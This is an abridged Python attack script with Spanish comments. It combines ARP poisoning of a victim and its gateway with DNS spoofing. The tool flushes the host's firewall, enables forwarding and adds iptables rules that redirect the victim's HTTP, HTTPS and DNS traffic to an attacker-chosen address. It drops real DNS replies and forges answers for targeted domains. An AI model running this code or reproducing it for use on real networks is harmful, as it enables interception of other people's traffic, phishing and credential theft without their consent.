...
class ARPPoisoning(threading.Thread):
	...
	def run(self):
		...
		try:		
			...
			send(arpPacket, verbose=False, loop=1) #? Nota 1
		except: 
...
class DNSSpoofing():
    ...
    def __init__(self, interface, capFilter, addressToRedirect, gateway='192.168.0.1'):
        '''
            Establecemos los valores para el ataque
        '''
    ...
    def startAttack(self, domains, verbose):
        ...
        try:
            self.cleanRules() # Cambia el ip tables
            self.enableForwarding() # permite que el SO funcione como gateway
    ...
    def redirectionRules(self):
        ...
        '''
        os.system(f"echo 0 > /proc/sys/net/ipv4/conf/{self.interface}/send_redirects")
        os.system("iptables --flush")
        os.system("iptables --zero")
        os.system("iptables --delete-chain")
        os.system("iptables -F -t nat")
        os.system(f"iptables --append FORWARD --in-interface {self.interface} --jump ACCEPT")
        os.system(f"iptables --table nat --append POSTROUTING --out-interface {self.interface} --jump MASQUERADE")
        os.system(f"iptables -t nat -A PREROUTING -p tcp --dport 80 --jump DNAT --to-destination {self.addressToRedirect}")
        os.system(f"iptables -t nat -A PREROUTING -p tcp --dport 443 --jump DNAT --to-destination {self.addressToRedirect}")

        os.system(f"iptables -A INPUT -p udp -s 0/0 --sport 1024:65535 -d {self.gateway} --dport 53 -m state --state NEW,ESTABLISHED -j DROP")
        os.system(f"iptables -A OUTPUT -p udp -s {self.gateway} --sport 53 -d 0/0 --dport 1024:65535 -m state --state ESTABLISHED -j DROP")
        os.system(f"iptables -A INPUT -p udp -s 0/0 --sport 53 -d {self.gateway} --dport 53 -m state --state NEW,ESTABLISHED -j DROP")
        os.system(f"iptables -A OUTPUT -p udp -s {self.gateway} --sport 53 -d 0/0 --dport 53 -m state --state ESTABLISHED -j DROP")

        os.system(f"iptables -t nat -A PREROUTING -i {self.interface} -p udp --dport 53 -j DNAT --to {self.addressToRedirect}")
        os.system(f"iptables -t nat -A PREROUTING -i {self.interface} -p tcp --dport 53 -j DNAT --to {self.addressToRedirect}")
    ...
    def ShowOrPoisoning(self, packet):
        ...
        if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0: #and len(self.target) > 0:
            ...
            try:		
                if self.verbose:
                    print (f'[+] Target Domain {self.targetDomain} searched... ')
                    print ('[+] Crafting the DNS Packet with tht following settings: ')
                    print (f'[+] IP Source: {requestIP.dst}')
                    print (f'[+] IP Dest: {requestIP.src}')
                    print (f'[+] Port Source: {requestUDP.dport}')
                    print (f'[+] Port Dest: {requestUDP.sport}')
                    print (f'[+] RRName: {packet.getlayer(DNS).qd.qname}')
                    print (f'[+] RData: {ipAddressTarget}')
                    print (f'[+] DNS Packet ID: {requestDNS.id}')
...
if __name__ == '__main__':
    ...
    parser.add_argument("-g", "--gateway", required=True, default="192.168.0.1", help="Gateway IP Address")
    parser.add_argument("-r", "--route", required=True, help="Redirect all HTTP/HTTPS traffic to the specified Ip Address.")
    ...
    parser.add_argument("-f", "--filter", required=False, default="udp port 50", help="Capture Filter.")
	
    args = parser.parse_args()
    gateway_ip = args.gateway
    victim_ip  = args.target
    
    spoof = DNSSpoofing(args.interface, args.filter, args.route, gateway_ip)

    spoof.enableForwarding()
    spoof.redirectionRules()	
	
    victim = ARPPoisoning(gateway_ip, victim_ip) # Envenenamos victima
    gateway = ARPPoisoning(victim_ip, gateway_ip) # Envenenamos Gateway
    victim.setDaemon(True)
    gateway.setDaemon(True)
    victim.start()
    gateway.start()

    spoof.startAttack(args.domains, args.verbose)
 
#__Notas__#
'''
    Nota 1:
        Con loop=1 lo que se establece es que el paquete se enviara de forma indefinida
